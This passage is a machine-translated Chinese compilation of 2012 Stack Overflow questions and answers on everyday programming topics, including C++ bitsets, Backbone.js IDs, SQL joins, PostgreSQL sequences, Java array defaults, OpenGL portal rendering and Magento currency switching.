[编辑] 请注意，根据图片的几何形状，转换 (x,y) -> (y,x) 可能指向不存在的点。考虑一张 50px x 100px 的图片，当您在点 (50,100) 时，您正在调用像素 (100,50) 来更改其颜色，而它在原始图片中不存在

# c++ - std::bitset 重新声明

> ID：13167134
> 
> 赞同：0
> 
> 时间：2012-10-31T20:42:36.307
> 
> 标签：c++, copy, instantiation, bitset

我想从我的位集代表的数字中减去一个整数。但是，我不知道如何 a) 将一个 bitset 复制到另一个 bitset，或者 b) 重新实例化一个 bitset：

```
bitset<7> bits(5);
int newresult=bits.to_ulong();
newresult=newresult-1;
bits=bitset<7> tempbits(newresult); // of course doesn't work 
```

重要的是我的最终结果是*位*组。如何正确地做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-31T20:49:29.993

```
bits = bitset<7>(newresult); 
```

# iphone - 在 UITableViewCell 内创建一个抽屉，如 Twitter 应用程序

> ID：13167136
> 
> 赞同：0
> 
> 时间：2012-10-31T20:42:38.250
> 
> 标签：iphone, ios, uitableview, twitter

当您创建一条我试图在我的 iPhone 应用程序中复制的新推文时，会有这组按钮/选项。我遇到了一些障碍。一，我不确切知道 Twitter 的开发人员在 UITableViewCell 中放置了什么，以便让按钮在单元格内均匀分布。第二，我对他们如何在您选择选项的同一单元格内创建那个小向上箭头感兴趣。最后，当用户在第一个和第二个选项之间单击时，他们是如何在底部单元格内的视图之间创建滑动动作的。它看起来像这样：

![在此处输入图像描述](../Images/caac7b50c3d5d591fa4480f3d7cd134b.png)

我真的很喜欢它的外观，它非常适合我的应用程序。除了设置单元之外，我什至不知道从哪里开始构建它。是否有人拥有他们拥有并愿意分享的图书馆或见解？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:16:34.547

当我们想做一些非常相似的事情时，我发现这个非常有用的网站：[Twitter iPhone 应用程序如何在桌子上实现侧滑？](http://idevrecipes.com/2011/04/14/how-does-the-twitter-iphone-app-implement-side-swiping-on-a-table/)

也许这可以帮助你在你的努力。

# backbone.js - 主干/下划线 uniqueId() 奇数

> ID：13167138
> 
> 赞同：4
> 
> 时间：2012-10-31T20:42:53.887
> 
> 标签：backbone.js, underscore.js, uniqueidentifier

我对 Backbone 和 Underscore 比较陌生，其中一个问题并不是真正的问题 - 只是出于好奇而困扰我。

我构建了一个非常简单的应用程序，它允许您在集合中添加和删除模型并在浏览器中呈现它们。它还具有`console.log`收藏的能力（所以我可以看到我的收藏）。

这是奇怪的事情：正在生成的 ID`1,3,5...`等等。我的代码是否有特定的原因，或者与 BB/US 有关？

这是一个工作小提琴：http: [//jsfiddle.net/ptagp/](http://jsfiddle.net/ptagp/)

和代码：

```
App = (function(){

var AppModel = Backbone.Model.extend({

    defaults: {
        id: null,
        item: null
    }

});

var AppCollection = Backbone.Collection.extend({

    model: AppModel

});

var AppView = Backbone.View.extend({

    el: $('#app'),

    newfield: $('#new-item'),

    initialize: function(){
        this.el = $(this.el);
    },

    events: {
        'click #add-new': 'addItem',
        'click .remove-item': 'removeItem',
        'click #print-collection': 'printCollection'
    },

    template: $('#item-template').html(),

    render: function(model){
        var templ = _.template(this.template);
        this.el.append(templ({
            id: model.get('id'),
            item: model.get('item')
        }));
    },

    addItem: function(){
        var NewModel = new AppModel({
            id: _.uniqueId(),
            item: this.newfield.val()
        });
        this.collection.add(NewModel);
        this.render(NewModel);  
    },

    removeItem: function(e){
        var id = this.$(e.currentTarget).parent('div').data('id');
        var model = this.collection.get(id);
        this.collection.remove(model);
        $(e.target).parent('div').remove();
    },

    printCollection: function(){
        this.collection.each(function(model){
            console.log(model.get('id')+': '+model.get('item'));
        });
    }

});

return {
    start: function(){
        new AppView({
            collection: new AppCollection()
        });
    }
};

});

$(function(){ new App().start(); }); 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-31T22:14:09.960

如果您查看backbone.js 源代码，您会注意到_.uniqueId 用于设置模型的`cid`： [https ://github.com/documentcloud/backbone/blob/master/backbone.js#L194](https://github.com/documentcloud/backbone/blob/master/backbone.js#L194)

这意味着每次创建模型实例时`_.uniqueId()`都会被调用。这就是导致它增加两次的原因。

# c#-4.0 - VS 2012 中的单元测试资源管理器

> ID：13167143
> 
> 赞同：0
> 
> 时间：2012-10-31T20:43:20.030
> 
> 标签：c#-4.0

我在 VS 2010 中使用 Visual NUnit 来运行运行良好的 specflow 测试。我最近安装了 VS 2012 并安装了 specflow 1.9 版。但是我在任何地方都找不到单元测试资源管理器选项（在视图->其他窗口中）。我也无法在 Online 中找到 Visual NUnit

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T20:44:39.447

只需开始`Test`在右上角的“快速启动”框中输入内容即可。

或者，单击文本、Windows、测试资源管理器。

# objective-c - 简单的 AVFoundation 故障排除情况

> ID：13167149
> 
> 赞同：0
> 
> 时间：2012-10-31T20:44:16.800
> 
> 标签：objective-c, ios, avfoundation, avcomposition

我有一个包含一些视频编辑工具的应用程序。我混合照片和视频，我遇到了一个奇怪的问题。当我用视频安排视频合成时，然后是照片，然后回到视频，它会正常播放，直到过渡回视频时它会冻结！我仍然听到音频，如果我四处寻找，视频会再次开始播放。我不知道如何错误检查这个！有人有想法么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T01:55:39.880

修复了我的情况，我创建了一个 1 秒的黑色片段并将其注入到照片点的构图中，现在它可以正常工作了

# python - 如何将日期格式化为 BYDAY（iCalendar 规范）

> ID：13167150
> 
> 赞同：1
> 
> 时间：2012-10-31T20:44:19.763
> 
> 标签：python, icalendar, rfc2445, rfc5545

我需要从我的**日期**值创建带有 BYDAY 参数的 RRULE 字符串。

有什么自然的方法吗？

我为此目的编写了这个实用程序代码：

```
import calendar

fweek_fday, mdays = calendar.monthrange(date.year, date.month)
# Get weekday of first day and total days in current month
mweeks = ((mdays+fweek_fday-1)//7)+1
# Get total weeks in current month
mday, wday = date.day, date.weekday()
# Get current day of month and current day as day of a week
week_days = ['MO', 'TU', 'WE', 'TH', 'FR', 'SA', 'SU']
week = ((mday+fweek_fday-1)//7)+(1 if wday>=fweek_fday else 0)
# Get current week no
week = -1 if week == mweeks else week
wday = week_days[wday]

output = "BYDAY=%d%s" % (week, wday) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-02T20:35:53.470

正如您在评论中所说，我还没有发现任何模块可以从一组约束中排除。如果可能的话，您可以考虑 RDATE 而不是 BYDAY。

您的另一个选择是：

```
import datetime
(y,w,d ) = date.isocalendar()
#w will be the iso week number, d the day of week
(y2,wb,d2) = datetime.datetime(date.year,date.month,1).isocalendar()
wkcount = 1 if d>=d2 else 0
# you need to account whether your date is a weekday after the one of the first of the month or not
print "BYDAY=%d%s"%(w-wb+wkcount,date.strftime("%a").upper()[0:2]) 
```

但是要小心，如果您的规则还包括 WKST

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:20:59.887

执行此操作的自然方法（除非您正在编写 iCalendar 库）是使用预先存在的 iCalendar 库作为对象，该库具有处理重复规则等的方法，而不是进行字符串解析和生成。

可能没有这样的库，在这种情况下你就不走运了。但是你应该做的第一件事就是寻找一个。

在[PyPI](http://pypi.python.org/pypi?%3aaction=search&term=iCalendar&submit=search)上快速搜索会发现许多可能性。第一个[iCalendar](http://pypi.python.org/pypi/icalendar/3.1)被描述为“iCalendar 文件的解析器/生成器”，这听起来像是一个不错的候选者。浏览文档，或者只是浏览`pip install`一下文档，看看它是否能做你想做的事。

# html - HTML5 新缓存不适用

> ID：13167151
> 
> 赞同：5
> 
> 时间：2012-10-31T20:44:21.073
> 
> 标签：html, google-chrome, cache-manifest

我有一个 HTML5 应用程序，它有一个大型清单文件，其中包含很多 PDF。第一次访问时，缓存会在几分钟内下载并正确应用。

据报道，当我进行更改并相应地更新清单时，它会再次下载缓存，但速度要快得多，这表明它实际上并没有获取文件。我正在监视缓存事件，一切都完成而没有错误，但没有进行任何更改。

如果我从清单中删除大部分 PDF，它的行为应该如此，所以我知道这是一个空间问题。有没有办法在下载新文件之前以编程方式清除缓存？我猜 fetch 没有发生，因为它空间不足，但没有引发错误事件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-03T12:59:59.567

清单行为是模糊的，如果遇到任何问题，下载将突然中断。

如果清单文件的内容没有更改为以前的版本，那么即使我们修改了列出的文件，它也永远不会下载任何文件。所以我们使用放置带有日期时间戳的注释行。

如果清单中列出的任何文件在服务器中不可用，则下载将停止，不会抛出任何错误。猜你的情况，文件名应该是错误的或者文件不存在。

希望能帮助到你...

# java - 空数组自动初始化内容？

> ID：13167153
> 
> 赞同：1
> 
> 时间：2012-10-31T20:44:26.140
> 
> 标签：java, arrays, initialization, declaration

怎么会

```
int alone;
System.out.println(alone); 
```

给出错误但

```
 int[] arr = new int[1];
 System.out.println(arr[0]); 
```

等于0？当你初始化一个空数组时，它是否会自动将其内容初始化为 0（或 null 等）？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-31T21:04:38.667

从[语言标准](http://docs.oracle.com/javase/specs/jls/se7/html/jls-10.html#jls-10.6)

> 否则，将创建一个指定长度的一维数组，并将数组的每个组件初始化为其默认值（第[4.12.5](http://docs.oracle.com/javase/specs/jls/se7/html/jls-4.html#jls-4.12.5)节）。

默认值为：

*   对于 byte 类型，默认值为 0，即 (byte)0 的值。

*   对于short类型，默认值为0，即(short)0的值。

*   对于 int 类型，默认值为 0，即 0。

*   对于 long 类型，默认值为 0，即 0L。

*   对于 float 类型，默认值为正零，即 0.0f。

*   对于 double 类型，默认值为正零，即 0.0d。

*   对于 char 类型，默认值为空字符，即 '\u0000'。

*   对于 boolean 类型，默认值为 false。

*   对于所有引用类型（第[4.3](http://docs.oracle.com/javase/specs/jls/se7/html/jls-4.html#jls-4.3)节），默认值为 null。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-31T20:45:19.973

是的，对于原始类型（布尔和字符除外），它将默认为零。如果是对象类型，它将默认为`null`.

这个[java教程](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/arrays.html)可以帮助你。

注意：正如 woot4Moo 回答的那样，这仅适用于实例变量。如果是局部变量，那么它不会默认为任何变量。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-31T20:45:46.173

是的，对于原始类型`number arrays`，它初始化为`0`， for `boolean[]`，它初始化为`false`， for `char[]`，它初始化为`NULL(ASCII value 0)`和 ，`objects [] including String[]`它的初始化为`null`。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-10-31T20:59:22.633

这里涉及两个不同的类似问题。首先请注意，所有变量类型都有一个默认值，该值因类型而异。至少有两次使用这些默认值：1) 声明成员变量和 2) 使用`new`运算符初始化数组。

请注意，如果您只是声明一个局部数组变量而不使用 初始化它，那么您会得到与声明一个简单变量`new`时相同的错误。`int`这是因为必须初始化所有局部变量。它们没有自动获得默认值。

另一方面，成员变量确实获得了默认值。同样，当您使用运算符创建数组对象时，数组`new`的元素会被初始化为适当的默认值。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-31T20:46:47.790

这取决于它的声明位置（在函数内的类副内）。如果它是类成员变量，它将被初始化为其默认值。数字类型为 0（浮点类型/双精度类型为 0.0），字符串为 null，布尔为 false，对象为 null。如果它在函数内部声明，则在`int alone`. 就数组而言，它将始终初始化其中包含的值。

# android - Android - 一次动画大量视图的优化

> ID：13167155
> 
> 赞同：3
> 
> 时间：2012-10-31T20:44:36.010
> 
> 标签：android, android-layout, animation, android-animation, android-view

在我的游戏中，我有一个 4x4 的 TextView 网格，每个显示一个字母，排列在一个 TableLayout 中。我想实现“顺时针旋转 90 度”功能，我希望网格旋转，但我希望字母保持直立。

这可以通过在 TableLayout 上应用 0 到 90 度的旋转以及在每个 TextView 上应用另一个 0 到 -90 度的动画来实现。然后它看起来好像字母仍然向上，因为网格将从 0 度旋转到 90 度，而 TextViews 的动画将取消旋转，因为它正好相反。

它可以工作，但动画在低端设备上不稳定，看起来不太好。我可以做些什么来提高动画性能，因为我现在一次为 17 个视图设置动画。我可能会采用一些技巧，例如禁用抗锯齿或在动画期间（在较慢的设备上）设置较低的颜色深度？或者有没有办法将 16 个 TextView 粘合在一起，让 Android 在这个粘合视图上只做一个动画？

![在此处输入图像描述](../Images/2c659ec6cd99a16b07ca208d1c3cde83.png)

# sql - 我想显示会员资格已过期的成员，我正在使用两个带有连接的表

> ID：13167161
> 
> 赞同：0
> 
> 时间：2012-10-31T20:45:05.480
> 
> 标签：sql, left-join, one-to-many

/* 显示会员已过期的日期 */

```
select m.FirstName, m.LastName, m.SocialSecurityNumber, m.Mobile, m.Email 
from Members as m
Join Memberships as ms on ms.MemberId = m.Id
where ms.ToDate < '2012-10-31' 
```

一个会员可以拥有多个会员资格，但只有一个有效会员资格。这条语句给了我很多用户，如果用户有 4 个会员资格并且 3 个已过期，它将显示 3 次。如果他没有任何有效的会员资格，我只希望该会员被包括一次。

我希望你明白我在这里想要做什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T20:47:28.327

最简单的方法是获取表中所有`Members`不在当前订阅`MemberID`值列表中的人员的列表。`Memberships`不需要连接，因此您不会有重复项。

```
SELECT m.FirstName, m.LastName, m.SocialSecurityNumber, m.Mobile, m.Email 
FROM Members AS m
WHERE m.ID NOT IN ( 
    SELECT ms.MemberID 
    FROM Memberships ms 
    WHERE ms.ToDate >= '2012-10-31') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T20:50:23.487

如果您需要获得最后一个会员资格，那么最好的方法是这样做：

```
select 
    m.FirstName, m.LastName,
    m.SocialSecurityNumber, m.Mobile, m.Email,
    ms.ToDate
from Members as m
    left outer join (
        select t.memberId, max(t.ToDate) as ToDate
        from Memberships as t 
        group by t.MemberId
    ) as ms on ms.MemberId = m.Id
where ms.ToDate < '2012-10-31' or ms.ToDate is null 
```

# grails - Grails Query，如何在结果中获取特定字段？

> ID：13167176
> 
> 赞同：1
> 
> 时间：2012-10-31T20:46:21.003
> 
> 标签：grails, groovy, grails-orm

我有域类：

```
class Product {

    String barcode
    String name
    String measurement

    static constraints = {

    }
} 
```

现在，我想获得一个列表，其中只有一个字段，例如“name”：

> Product.findAllByNameIlike("%$params.name%",[order: "desc" ])

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-31T21:45:33.007

```
Product.findAllByNameIlike("%$params.name%",[order: "desc" ])?.collect{it.name} 
```

# android - Google Maps 视网膜地图标记无法在 Android Jellybean 本机浏览器上正确显示

> ID：13167177
> 
> 赞同：1
> 
> 时间：2012-10-31T20:46:21.817
> 
> 标签：android, google-maps, google-maps-markers, android-4.2-jelly-bean

使用优化时地图标记的缩放和裁剪不正确：false。我已经在几个 android 设备和 iphone 上进行了测试。

我遇到的问题似乎只影响 Android Jelly Bean、ICS 及以下 Android 上的本机浏览器，并且所有 iPhone 都正确显示地图标记。Android Jelly Bean 上的 Chrome 也能正确显示。

我有代码示例[优化 false](http://www.nonpixel.com/gmap/mapmarker.html)和[优化 true](http://www.nonpixel.com/gmap/mapmarker-optimized.html)。

将优化设置为 false 时的屏幕截图位于此处：nonpixel.com/gmap/screenshot.png （抱歉，每个帖子仅限两个超链接）

我发现的最接近的相关问题是 9208916（再次抱歉没有链接），但解决方案不起作用。

其他一些观察：

*   添加动画时：google.maps.Animation.DROP，地图标记以正确的大小进行动画处理，但它似乎位于较大、大小不正确的标记后面。

*   地图标记阴影正确显示

*   地图图块本身最初以“retinafied”加载，但随后切换到优化的模糊图块（您可以在上面列出的屏幕截图中看到）

# c++ - C++ 库 main() 名称冲突

> ID：13167180
> 
> 赞同：1
> 
> 时间：2012-10-31T20:46:51.853
> 
> 标签：c++, linker, namespaces

我在 iOS 项目中使用 Tesseract OCR 库。我的项目是在 RubyMotion 中构建的，由于重复符号，无法链接 Tesseract 库：

```
Link ./build/iPhoneSimulator-5.0-Development/myapp.app/myapp
duplicate symbol _main in:
    /Users/Me/Documents/myapp/vendor/Tesseract/libtesseract_all.a(svpaint.o)
    ./build/iPhoneSimulator-5.0-Development/objs/main.o
ld: 1 duplicate symbol for architecture i386 
```

Grepping 项目发现了 20 个 int main() 实例。有没有办法重命名 main() 函数，或者以其他方式解决这个符号冲突？

# sql - 如何定义这样的计算列？

> ID：13167182
> 
> 赞同：0
> 
> 时间：2012-10-31T20:46:58.933
> 
> 标签：sql, database, sql-server-2008

我`Equipment`在 SQL Server 2008 中有一个像这样的表：

```
CREATE TABLE [dbo].[Equipment](
[EquipmentID] [nchar](10) NOT NULL,
[EquipmentName] [nchar](50) NOT NULL,
[ProducedDate] [date] NOT NULL,
[WarrantyPeriod] [int] NOT NULL,
[SerialNumber] [nchar](20) NOT NULL,
[BrandID] [tinyint] NOT NULL,
CONSTRAINT [PK_Equipment] PRIMARY KEY CLUSTERED 
) 
```

我希望有一个计算列`WarrantyStatus`，该列将在计算时`Unexpired`或`Expired`在计算时返回，基于列`ProducedDate`和`WarrantyPeriod`.

这是错误的，但这是我想要的：

```
ALTER TABLE [dbo].[Equipment]
ADD [WarrantyStatus] AS IIF(DATEDIFF(MONTH, [ProducedDate], GETDATE()) < [WarrantyPeriod], "Unexpired", "Expired") 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T20:52:34.877

尝试：

```
ALTER TABLE [dbo].[Equipment]
ADD [WarrantyStatus] AS 
case when DATEDIFF(MONTH, [ProducedDate], GETDATE()) < [WarrantyPeriod]
then 'Unexpired'
else 'Expired'
end 
```

# jquery-ui - jqueryui - 按钮单击回调中的 if 语句

> ID：13167184
> 
> 赞同：0
> 
> 时间：2012-10-31T20:47:07.657
> 
> 标签：jquery-ui

我做了一些明显迟钝的事情，还是有一种特殊的格式来评估`if()`jqueryUI 按钮回调中的条件？

```
$(function(){
    var focus_control = '';

    $( '#alert' ).dialog({
        autoOpen:false,
        show: 'fade',
        hide: 'fade',
        buttons: {
            Ok: function() {
                $(this).dialog('close');

                //Next line works if uncommented
                //$('#username').focus();

                //This if block breaks the js, but all works if this block commented out
                //var focus_control assigned elsewhere (ajax)
                if (focus_control=='staff_pick') {
                    $('#staff_pick').focus();
                }else if {focus_control=='username') {
                    $('#username').focus();
                }
            }
        }
    });
}); 
```

有没有更好的方法来重写这个？我试过了：

```
 if (focus_control!='') {
                    $('#%focus_control%').focus();
                } 
```

# c# - 使用值从 .net hastable 中删除项目

> ID：13167185
> 
> 赞同：0
> 
> 时间：2012-10-31T20:47:08.980
> 
> 标签：c#, .net, hashtable

有没有办法不遍历整个哈希表来删除具有指定值的键值对？

如果没有，我可以使用更好的类型来允许我这样做吗？

这里有一些关于我在做什么的背景。我确定我过于复杂并且有更好的方法......

我有一个键/值列表，其中键是“源”电子表格中的列名，值是“目标”系统中的字段名。

当我遍历“源”中的列并匹配哈希表中的键时，我可以删除这些对。

完成后，“源”中的列可能在哈希表中没有匹配的键。用户可以通过选择剩余值之一来覆盖它。

这就是我需要从哈希表中删除该键/值的地方。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-31T20:49:33.143

> 有没有办法不遍历整个哈希表来删除具有指定值的键值对？

不，哈希表的关键在于它可以快速查找*key*，而不是 value。

请注意，您通常应该使用`Dictionary<TKey, TValue>`，除非您*真的*使用 .NET 1.1。

> 如果没有，我可以使用更好的类型来允许我这样做吗？

如果您要拥有唯一值和唯一键，则可以只有两个字典，单向一个。然后您可以查找与相关值对应的键，并通过键从两个字典中删除。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-31T20:51:02.113

不，那里没有。

如果你想这样做，它通常意味着两件事之一

1.  您的键和值颠倒了。让你的价值观成为你的钥匙，让你的钥匙成为你的价值观。

2.  你需要两个字典。一个`Dictionary<T1, T2>`和一个`Dictionary<T2,T1>`。您需要填充它，使每一对都在两个字典中并且是一致的。这也意味着每个值都是唯一的，而不仅仅是键。如果您当前的值不是唯一的，那么您需要一个`Dictionary<T2, List<T1>>`或类似的东西，因为每个值可能映射到多个键。这样做也会使维护你的结构……更难。`TwoWayDictionary`（如果您需要，请考虑制作一种新类型。）

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-10-31T20:50:01.277

HashTable 类实现 IEnumerable，因此您可以使用查询 (LINQ) 而不是迭代

# sql - SQLSTATE[22P02]：无效的文本表示

> ID：13167186
> 
> 赞同：2
> 
> 时间：2012-10-31T20:47:11.483
> 
> 标签：sql, database, postgresql

我正在使用带有 PDO 的**Postgresql**和**PHP 5.3.x**来访问数据库。

我有这个 SQL 查询（精简版），带有 PDO 的占位符来填写：

```
INSERT INTO t_articles (a_article_id) VALUES (?) RETURNING a_id 
```

我想`a_article_id`成为一个数字，比如`5`，否则它应该是子查询的结果：

```
((SELECT max(a_article_id) FROM t_articles) + 1) 
```

但是，PDO 说：

```
SQLSTATE[22P02]: Invalid text representation: 7 ERROR: invalid input syntax for integer: "(SELECT max(a_article_id) FROM t_articles) + 1" 
```

而且我尝试将子查询设置为默认值，但显然不允许这样做：

```
ERROR:  cannot use sub query in default expression 
```

如何插入此子查询的结果（或者可以做些什么来获得相同的结果）？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-31T21:17:40.790

您必须为此使用 INSERT...SELECT ：

```
insert into t_articles (a_article_id)
select max(a_article_id) + 1
from t_articles
returning id 
```

或者，如果您不需要 的连续值，请为其`a_article_id`使用[序列](http://www.postgresql.org/docs/current/static/sql-createsequence.html)：

1.  创建一个序列，我们称之为`article_id_sequence`。

    ```
    -- Get the current max(a_article_id)+1 to use instead of FIRST_VAL below
    create sequence article_id_sequence
    start FIRST_VAL
    owned by t_articles.a_article_id; 
    ```

2.  将默认值设置`t_articles.a_article_id`为`nextval('article_id_sequence')`。

    ```
    alter table t_articles
    alter column a_article_id
    set default nextval('article_id_sequence'); 
    ```

3.  插入时使用默认值：

    ```
    insert into t_articles (a_article_id)
    values (default)
    returning id; 
    ```

# dotnetnuke - 将注册用户限制在文件管理器上他们自己的唯一文件夹

> ID：13167187
> 
> 赞同：1
> 
> 时间：2012-10-31T20:47:13.863
> 
> 标签：dotnetnuke

我们正在使用 DNN 6.2 并试图限制注册用户，以便他们可以将内容上传到自己的唯一文件夹。我们不希望通过用户角色来执行此操作。

出现此问题的一些示例是注册用户使用所见即所得上传内容时，或使用 DNN 模块表单和列表时。目前所有用户都可以看到门户网站上的所有内容。目标是让用户只能看到自己上传的内容。

另外，如果这是实现这一目标的最简单方法，我们是否愿意购买模块？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T05:46:34.560

这是开箱即用的。您可以在现有文件夹的基础上实现自己的文件夹提供程序来执行此操作。查看[这篇文章](http://www.dotnetnuke.com/Resources/Wiki/Page/Folder-providers.aspx)以获得更多帮助

# ruby-on-rails - 渲染 CSV 发送文件（就像我使用 send_data 一样）而不是渲染文本

> ID：13167188
> 
> 赞同：2
> 
> 时间：2012-10-31T20:47:22.257
> 
> 标签：ruby-on-rails, csv, mime-types, actionview

以下代码返回一个`people.csv`文件而不是呈现文本。如果我不使用 respond_to 块并简单地呈现文本，浏览器将按预期工作。是什么迫使浏览器在文件中发送数据？正如预期的那样，mime 类型是“text/csv”。

```
# /app/controllers/people_controller.rb
class PeopleController < ApplicationController
  def index
    respond_to do |format|
      format.csv { render text: "Hello, world" }
    end
  end
end 
```

**推论**：渲染 xls，这是一个正确注册的 mime 类型，带有模板强制渲染 application.html，这对我来说看起来很奇怪。

```
# /app/controllers/people_controller.rb
class PeopleController < ApplicationController
  def index
    respond_to do |format|
      format.xls
    end
  end
end 
```

.

```
# /app/views/people/index.xls.erb
<table border="1">
  <tr>
    <th>ID</th>
    <th>Name</th>
  </tr>
  <% @people.each do |person| %>
  <tr>
    <td><%= person.id %></td>
    <td><%= person.name %></td>
  </tr>
  <% end %>
</table> 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-31T23:44:08.227

第一部分的答案是强制 text/plain mime-type with `content_type`，如下所示：

```
respond_to do |format|
  format.csv { render text: "Hello, world", content_type: 'text/plain' }
end 
```

# opengl - OpenGL 中的门户效果

> ID：13167192
> 
> 赞同：2
> 
> 时间：2012-10-31T20:47:43.477
> 
> 标签：opengl, portal

我想知道门户游戏的工作方式。你可以站在一个门户和另一个门户之间，这太迷人了。

每次你拍摄一个传送门，也许，关卡就会被复制过来？还是只是相机/截锥体/视口效果？

我想在OpenGL中开发它，有什么建议吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-31T20:57:14.967

这对他们来说是一场噩梦。用“导演的评论”玩游戏，你会得到一些有趣的采访提到它。

这是基本的想法。当您查看蓝色门户时，您不是在查看关卡的副本，而只是查看从不同角度呈现的同一事物。引擎渲染从橙色门户“后面”的角度通过门户看到的部分，对应于您在蓝色门户前面的位置。需要特别注意不要显示此虚拟视点和橙色门户背面之间的任何内容。视锥体已调整为仅包含您可以通过蓝色门户看到的位。

但这还不是全部，因为如果您可以通过另一个门户看到一个门户怎么办？您将获得“无限”的反馈效果。在实践中，效果实际上并不是无限的。它只是进行足够的迭代（例如 40 次），直到图像变得足够小以至于您无法分辨出差异。每次下一次迭代都可以以较小的尺寸渲染，因此我们不必以全分辨率渲染整个关卡 40 次。但是仍然需要进行裁剪、剔除等工作。

在 OpenGL 中，这可以通过使用帧缓冲区对象 (FBO) 渲染到纹理来完成，或者直接渲染到最终结果但使用模板缓冲区进行剪辑（感谢[datenwolf](https://stackoverflow.com/a/13167521/14637)！）。但是，正如上面的段落所示，这只是故事的开始。如果您刚刚开始使用 OpenGL，恐怕您完全处于难度等级的错误一端。

（顺便说一句：物理引擎也发生了一些有趣的事情，其中​​一个通过门户一半的对象需要同时在两个地方。另一个令人头疼的问题。）

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-10-31T21:13:59.743

它们的关键字是：模板缓冲区、剪辑平面和递归渲染。

模板缓冲区用于切出视口中的“门户”部分。这是通过在渲染场景的主视图时渲染一些辅助几何体来实现的。

在下一步中，场景会被渲染一次，但这一次场景是通过额外的变换移动的，即描述门户彼此相对对齐的变换。然后在入口平面上放置一个剪切平面并渲染场景。在此渲染期间，可能会渲染另一个门户模板，这会触发进一步的递归。为了防止在镜像大厅的情况下出现无限循环，存在递归限制。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T20:51:48.103

我不知道具体细节，但这可以通过多种方式实现。我假设他们在门户的位置使用相机和渲染到纹理功能，以便从该视图捕获场景并将其渲染到门户的位置。它们还允许更多的迭代，我仍然不确定它是如何工作的（可能会降低渲染到纹理的分辨率，直到它达到一个像素或预定义的深度值）。

# php - 基于货币链接到magento网站

> ID：13167206
> 
> 赞同：1
> 
> 时间：2012-10-31T20:49:51.833
> 
> 标签：php, magento, google-ads-api

基本上我需要链接到我的网站，但我需要根据使用的链接更改货币。

我需要这个用于 google adwords，如果我在 adwords 中定位爱尔兰，我需要我的网站显示欧元。如果我的目标是英国，我需要它以英镑等显示。

该网站是用 magento 开发的，我在页面顶部有一个选择框，可以更改整个网站的货币。

任何想法我怎么能做到这一点，网站是[www.funkychristmasjumpers.com](http://www.funkychristmasjumpers.com)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-01T03:11:16.637

[Magento 论坛](http://www.magentocommerce.com/boards/viewthread/60188/#t191078)上的此链接的信用

您可以随时将以下代码添加到主题中 /template/directory/currency.phtml 文件的顶部。我已经在 1.7.0.2 实例中对此进行了测试，并且效果很好。

您只需将 cy=code 添加到 URL 的末尾，因此对于 www.funkychristmasjumpers.com，它将[http://www.funkychristmasjumpers.com?cy=USD](http://www.funkychristmasjumpers.com?cy=USD)默认为 USD。代码应用货币，然后重定向回目标页面

```
$currentCurrency = $this->getCurrentCurrencyCode();

if(!isset($currentCurrency)) $currentCurrency = 'NA';

$currencies = array("GBP","USD","EUR");

if(isset($_GET['cy'])) 
{
    if (in_array(strtoupper($_GET['cy']),$currencies)) {
        if(strtoupper($_GET['cy']) != $currentCurrency)
        {
            header("Location: ".$this->helper('directory/url')->getSwitchCurrencyUrl()."currency/".$_GET['cy']);
            exit;
        }
    }
} 
```

# java - 将 Java 3d 对象写入自定义文件类型

> ID：13167207
> 
> 赞同：1
> 
> 时间：2012-10-31T20:49:51.887
> 
> 标签：java, serialization, encoding, binary, java-3d

所以，我的问题基本上有两个子问题。我想创建我的自定义文件类型，可能使用 UTF-8 编码。我想我只能通过使用我还不知道的将编码设置为 UTF-8 或任何适合的方法保存具有首选扩展名的文件来做到这一点。
我的扩展名是“.molb”。

现在，问题是我需要将 3d 对象（例如球体和圆柱体）写入该文件，并且当我打开文件时，需要以某种方式识别并添加到我的宇宙中。
一些文章建议序列化对象和使用 FileBuffers，但没有一篇文章真正帮助我理解如何将其应用于我自己的问题。

为了澄清起见，我将给出以下示例： [此图像](http://imageshack.us/photo/my-images/840/whatineed.jpg/) 显示了一些对象（圆柱体和球体），它们应该以一种或另一种形式保存在文件中，因此当打开该文件时，这些对象会显示保存的属性（位置、颜色、方向等）。此外，我的文件将包含一个存储球体 xyz 位置的数组

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-31T21:01:54.847

如果您的类实现`Serializable`，您可以非常简单地将它们写入文件。

```
DataOutputStream os = new DataOutputStream(new FileOutputStream("myfile.molb"));
os.writeObject(sphare);
os.close(); 
```

这个文件是二进制的。您不必关心编码。

但是，如果您想使用 XML、JSON 或其他文本格式序列化您的对象，您可能需要使用其他接受编码的构造函数打开带有 writer 的包装流：`new OutputStreamWriter(new FileOutputStream("my.txt"), "UTF-8)"`。您还必须添加一些注释（例如 JAXB 或 Jakson）以启用 object-to-xml（或 json）序列化。

# iphone - nib 文件已删除，但键值连接仍然存在 - NSUnknownKeyException

> ID：13167211
> 
